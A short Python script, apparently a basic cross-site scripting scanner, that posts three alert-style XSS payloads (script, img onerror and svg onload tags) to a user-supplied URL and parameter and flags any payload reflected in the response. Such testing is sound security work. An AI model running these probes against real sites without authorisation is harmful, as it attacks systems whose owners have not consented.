import requests

target_url = input("Enter the target URL (e.g., http://example.com/comment): ")
vulnerable_param = input("Enter the vulnerable parameter name (e.g., comment): ")

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
]

print(f"\n🔍 Scanning {target_url} for XSS vulnerabilities...\n")

for payload in xss_payloads:
    print(f"🛠️  Testing: {payload}")
    
    # Send POST request (since the comment form expects POST)
    data = {vulnerable_param: payload}
    response = requests.post(target_url, data=data)

    # Check if the payload is reflected in the response
    if payload in response.text:
        print(f"🚨 XSS Vulnerability Detected with Payload: {payload}")
        break
else:
    print("✅ No XSS vulnerabilities detected.")
